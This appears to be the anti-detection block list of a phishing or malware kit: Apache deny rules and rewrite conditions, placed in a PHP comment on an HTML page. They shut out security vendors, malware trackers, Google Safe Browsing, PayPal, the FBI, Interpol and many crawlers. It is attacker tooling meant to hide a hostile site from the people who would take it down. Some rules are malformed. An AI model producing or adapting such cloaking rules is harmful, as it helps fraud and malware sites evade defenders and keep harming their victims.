<!DOCTYPE html>
<html>
<body>
<?php
/*
deny from 89.207.18.182/22
deny from 173.194.69.147/22
deny from 149.3.176.145/22
deny from 66.235.156.128/22
deny from 173.194.69.125/22
deny from 173.194.69.120/22
deny from 173.194.69.102/22
deny from 173.194.69.95/22
deny from 173.194.69.94/22
deny from 173.194.69.91/22
deny from 173.0.88.2/22
deny from 173.0.84.2/22
deny from 173.0.84.34/22
deny from 173.0.88.2/22
deny from 173.0.88.34/22
deny from 2.20.6.85/22
deny from 63.245.213.92/22
deny from 173.194.69.106/22
deny from 173.194.69.147/22
deny from 173.194.69.99/22
deny from 173.194.69.103/22
deny from 173.194.69.104/22
deny from 173.194.69.105/22
deny from 173.194.69.94/22
deny from 173.194.69.106/22
deny from 173.194.69.147/22
deny from 173.194.69.99/22
deny from 173.194.69.103/22
deny from 173.194.69.104/22
deny from 173.194.69.105/22
deny from 173.194.69.94/22
deny from 63.245.213.92/22
deny from 63.245.217.20/22
deny from 64.62.203.172/22
deny from 173.194.69.102/22
deny from 173.194.69.113/22
deny from 173.194.69.138/22
deny from 173.194.69.139/22
deny from 173.194.69.100/22
deny from 173.194.69.101/22
deny from 64.62.203.172/22
deny from 63.245.217.71/22
deny from 188.112.175.207/22
deny from 66.235.139.166/22
deny from 66.235.138.2/22
deny from 66.235.138.59/22
deny from 66.235.139.153/22
deny from 66.235.139.152/22
deny from 66.235.138.44/22
deny from 66.235.139.118/22
deny from 66.235.138.18/22
deny from 66.235.139.121/22
deny from 66.235.138.19/22
deny from 66.235.134.160/22
deny from 66.235.133.8/22
deny from 66.235.133.52/22
deny from 66.235.133.33/22
deny from 66.235.132.152/22
deny from 66.235.133.62/22
deny from 66.235.132.232/22
deny from 66.235.132.118/22
deny from 66.235.133.11/22
deny from 66.235.132.121/22
deny from 149.20.57.227
deny from 199.48.147.36
deny from 37.59.162.218
deny from 89.122.57.201
deny from 69.163.205.29
deny from 74.120.15.150
deny from 109.163.233.200
deny from 79.120.86.20
deny from 31.172.30.4
deny from 109.65.136.19
deny from 66.150.14.185
deny from 50.97.98.130
deny from 66.150.14.185
deny from 80.237.226.73
deny from 64.34.184.153
deny from 66.230.230.230
deny from 71.165.245.158
deny from 74.120.15.150
deny from 76.73.56.7
deny from 77.109.139.87
deny from 81.218.219.122
deny from 83.86.110.188
deny from 83.142.228.14
deny from 83.249.87.238
deny from 85.17.92.13
deny from 85.235.31.248
deny from 87.118.104.203
deny from 88.80.28.70
deny from 88.208.121.151
deny from 89.253.97.235
deny from 91.121.170.32
deny from 94.249.153.47
deny from 95.143.193.145
deny from 109.169.29.56
deny from 109.123.119.163
deny from 137.56.163.46
deny from 137.56.163.64
deny from 173.193.221.28
deny from 192.251.226.205
deny from 192.251.226.206
deny from 199.48.147.35
deny from 199.48.147.36
deny from 199.48.147.38
deny from 199.48.147.40
deny from 199.48.147.41
deny from 208.66.135.190
deny from 209.44.114.178
deny from 209.159.142.164
deny from 209.159.143.130
deny from 213.220.233.230
deny from 8.18.38.105 
deny from 62.141.58.13
deny from 62.163.180.154
deny from 77.171.107.207
deny from 78.47.251.152   
deny from 81.169.155.246
deny from 82.194.86.135
deny from 83.163.192.49
deny from 91.121.152.114 
deny from 91.213.50.235
deny from 93.167.245.178 
deny from 94.23.215.184
deny from 174.138.169.218
deny from 64.34.162.160 
deny from 66.249.9.107   
deny from 66.96.16.32 
deny from 78.107.233.68
deny from 78.107.237.16
deny from 83.170.92.9   
deny from 85.214.73.63 
deny from 91.124.187.225 
deny from 194.0.229.54
deny from 195.43.157.85 
deny from 212.78.238.92 
deny from 217.114.211.20  
deny from 62.24.222.132
deny from 62.24.222.131
deny from 66.235.133.14/22
deny from paypal.com
deny from 112.2o7.com
deny from firefox.com
deny from apple.com
deny from zeustracker.abuse.ch
deny from virustotal.com
deny from adminus.net
deny from aegislab.com
deny from alienvault.com
deny from antiy.net
deny from avast.com
deny from team-cymru.org
deny from eset.com
deny from fireeye.com
deny from microsoft.com
deny from kernelmode.info
deny from malwaredomainlist.com
deny from wilderssecurity.com
deny from eset-la.com
deny from blogs.eset-la.com
deny from welivesecurity.com
deny from urlquery.net
deny from anubis.iseclab.org
deny from reclassify.url.trendmicro.com
deny from dragonjar.org
deny from vpro.su
deny from cclub.su
deny from securitybydefault.com
deny from matthewfl.com
deny from garyshood.com
deny from virscan.org
deny from malwarebytes.org
deny from community.norton.com
deny from avira.com
deny from bitdefender.com
deny from c-sirt.org
deny from clean-mx.de
deny from crdfglobal.org
deny from comodo.com
deny from fbi.gov
deny from interpol.int
deny from cybercitizenship.org
deny from cybercrime-tracker.net
deny from drweb.com
deny from kaspersky.com
deny from bitdefender.com
deny from malwares.com
deny from zvelo.com
deny from zcloudsec.com
deny from yandex.com
deny from facebook.com
deny from wepawet.iseclab.org
deny from websense.com
deny from vxvault.siri-urz.net
deny from tekdefense.com
deny from malc0de.com
deny from malwareblacklist.com
deny from minotauranalysis.com
deny from Sacour.cn
deny from scoop.it
deny from tencent.com
deny from spyeyetracker.abuse.ch
deny from abuse.ch
deny from SCUMWARE.org
deny from scumware.org
deny from sophos.com
deny from securebrain.co.jp
deny from quttera.com
deny from hosts-file.net
deny from amada.abuse.ch
deny from palevotracker.abuse.ch
deny from blogger.com
deny from phishtank.com
deny from netcraft.com
deny from malwared.ru
deny from malware.com.br
deny from malekal.com
deny from k7computing.com 
deny from gdata.com
deny from gdatasoftware.com
deny from fortinet.com
deny from emsisoft.com
deny from quttera.com
deny from opera.com
deny from infospyware.com
deny from kaspersky.com 
deny from env=stealthed
allow from all
RewriteEngine on
# Options +FollowSymlinks
RewriteCond %{HTTP_REFERER} google\.com [NC,OR]
RewriteCond %{HTTP_REFERER} google\.com
RewriteCond %{HTTP_REFERER} paypal\.com
RewriteCond %{HTTP_REFERER} firefox\.com
RewriteRule .* - [F]
RewriteCond %{HTTP_USER_AGENT} ^googlebot [OR] 
RewriteCond %{HTTP_USER_AGENT} ^BlackWidow [OR] 
RewriteCond %{HTTP_USER_AGENT} ^ChinaClaw [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Custo [OR] 
RewriteCond %{HTTP_USER_AGENT} ^DISCo [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Download\ Demon [OR] 
RewriteCond %{HTTP_USER_AGENT} ^eCatch [OR] 
RewriteCond %{HTTP_USER_AGENT} ^EirGrabber [OR] 
RewriteCond %{HTTP_USER_AGENT} ^EmailSiphon [OR] 
RewriteCond %{HTTP_USER_AGENT} ^EmailWolf [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Express\ WebPictures [OR] 
RewriteCond %{HTTP_USER_AGENT} ^ExtractorPro [OR] 
RewriteCond %{HTTP_USER_AGENT} ^EyeNetIE [OR] 
RewriteCond %{HTTP_USER_AGENT} ^FlashGet [OR] 
RewriteCond %{HTTP_USER_AGENT} ^GetRight [OR] 
RewriteCond %{HTTP_USER_AGENT} ^GetWeb! [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Go!Zilla [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Go-Ahead-Got-It [OR] 
RewriteCond %{HTTP_USER_AGENT} ^GrabNet [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Grafula [OR] 
RewriteCond %{HTTP_USER_AGENT} ^HMView [OR] 
RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR] 
RewriteCond %{HTTP_USER_AGENT} ^Image\ Stripper [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Image\ Sucker [OR] 
RewriteCond %{HTTP_USER_AGENT} Indy\ Library [NC,OR] 
RewriteCond %{HTTP_USER_AGENT} ^InterGET [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Internet\ Ninja [OR] 
RewriteCond %{HTTP_USER_AGENT} ^JetCar [OR] 
RewriteCond %{HTTP_USER_AGENT} ^JOC\ Web\ Spider [OR] 
RewriteCond %{HTTP_USER_AGENT} ^larbin [OR] 
RewriteCond %{HTTP_USER_AGENT} ^LeechFTP [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Mass\ Downloader [OR] 
RewriteCond %{HTTP_USER_AGENT} ^MIDown\ tool [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Mister\ PiX [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Navroad [OR] 
RewriteCond %{HTTP_USER_AGENT} ^NearSite [OR] 
RewriteCond %{HTTP_USER_AGENT} ^NetAnts [OR] 
RewriteCond %{HTTP_USER_AGENT} ^NetSpider [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Net\ Vampire [OR] 
RewriteCond %{HTTP_USER_AGENT} ^NetZIP [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Octopus [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Offline\ Explorer [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Offline\ Navigator [OR] 
RewriteCond %{HTTP_USER_AGENT} ^PageGrabber [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Papa\ Foto [OR] 
RewriteCond %{HTTP_USER_AGENT} ^pavuk [OR] 
RewriteCond %{HTTP_USER_AGENT} ^pcBrowser [OR] 
RewriteCond %{HTTP_USER_AGENT} ^RealDownload [OR] 
RewriteCond %{HTTP_USER_AGENT} ^ReGet [OR] 
RewriteCond %{HTTP_USER_AGENT} ^SiteSnagger [OR] 
RewriteCond %{HTTP_USER_AGENT} ^SmartDownload [OR] 
RewriteCond %{HTTP_USER_AGENT} ^SuperBot [OR] 
RewriteCond %{HTTP_USER_AGENT} ^SuperHTTP [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Surfbot [OR] 
RewriteCond %{HTTP_USER_AGENT} ^tAkeOut [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Teleport\ Pro [OR] 
RewriteCond %{HTTP_USER_AGENT} ^VoidEYE [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Web\ Image\ Collector [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Web\ Sucker [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebAuto [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebCopier [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebFetch [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebGo\ IS [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebLeacher [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebReaper [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebSauger [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Website\ eXtractor [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Website\ Quester [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebStripper [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebWhacker [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WebZIP [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Wget [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Widow [OR] 
RewriteCond %{HTTP_USER_AGENT} ^WWWOFFLE [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Xaldon\ WebSpider [OR] 
RewriteCond %{HTTP_USER_AGENT} ^Zeus 
RewriteRule ^.* - [F,L]
RewriteEngine on
RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing-cache.google.com/.*$ [NC]
RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing.clients.google.com/safebrowsing/.*$ [NC]
RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://safebrowsing.clients.google.com/.*$ [NC]
RewriteCond %{HTTP_REFERER} ^http(s)?://(www\.)?http://plus.google.com/.*$ [NC]
RewriteRule .* - [F,L]

Options -Indexes  
##Off to the Mouse they go##

</body>
</html>
